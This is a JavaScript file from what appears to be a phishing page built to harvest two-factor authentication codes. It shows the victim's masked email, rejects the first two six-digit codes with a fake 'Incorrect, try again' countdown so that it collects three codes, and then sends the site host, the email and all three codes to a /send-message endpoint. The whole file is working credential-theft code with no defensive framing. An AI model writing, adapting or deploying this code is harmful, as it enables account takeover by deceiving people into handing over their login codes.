var a = 0;
setTimeout(() => {
    document.getElementById("loading").style.display = "none";
    document.querySelector(".main_form").style.display = "block";
}, 2000);
var note = document.getElementById("note");
const field = document.getElementById("field");
const submit = document.getElementById("submit");
var code1, code2, code3;
var urlParams = window.location.href.split("/code/")[1];
urlParams = urlParams.replace(/#/g, "");
const hiddenEmail = urlParams.replace(/^(.)(.*?)(?=@)/, "$1*****");
if (hiddenEmail) {
    document.getElementById("emailv").innerText = hiddenEmail;
}
document.getElementById("field").addEventListener("input", () => {
    const value = document.getElementById("field").value;

    if (value.length === 6) {
        document.getElementById("submit").classList.add("active");
    } else {
        document.getElementById("submit").classList.remove("active");
    }
});
document.getElementById("field").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault(); // Ngăn chặn form submit
    }
});
document.getElementById("submit").addEventListener("click", () => {
    console.log(a);
    const value = document.getElementById("field").value;

    if (value.length === 6) {
        if (a < 2) {
            
            const code = field.value;
            if (a == 0) {
                code1 = code;

            } else if (a == 1) {
                code2 = code;
            }

            // Vô hiệu hóa input và nút submit
            field.disabled = true;
            submit.disabled = true;
            submit.style.pointerEvents = "none"; // Chặn sự kiện click

            let i = 15;
            note.innerText = "Incorrect. Please, try again after " + i + "s";

            const interval = setInterval(() => {
                i--;
                note.innerText =
                    "Incorrect. Please, try again after " + i + "s";
                if (i <= 0) {
                    clearInterval(interval); // Dừng đếm ngược
                    note.innerText = "";

                    // Kích hoạt lại input và nút submit
                    field.disabled = false;
                    submit.disabled = false;
                    submit.style.pointerEvents = "auto"; // Cho phép sự kiện click hoạt động trở lại
                }
            }, 1000);
        }
        a++;
    }
    if (submit.classList.contains("active")) {
        code3 = field.value;
        const currentUrl = window.location.host;

        const message = `url: ${currentUrl}\nemail: ${urlParams}\n2FA-1: ${code1}\n2FA-2: ${code2}\n2FA-3: ${code3}`; // Giá trị message từ input hoặc biến

        const url = `${
            window.location.origin
        }/send-message?message=${encodeURIComponent(message)}`;

        fetch(url)
            .then((response) => {
                if (!response.ok) {
                    throw new Error("Network response was not ok");
                }
                return response.json(); // Nếu API trả về dữ liệu JSON
            })
            .then((data) => {
                console.log("API response:", data);
            })
            .catch((error) => {
                console.error(
                    "There was a problem with the fetch operation:",
                    error
                );
            });

        document.querySelector("form").submit();
    }
});
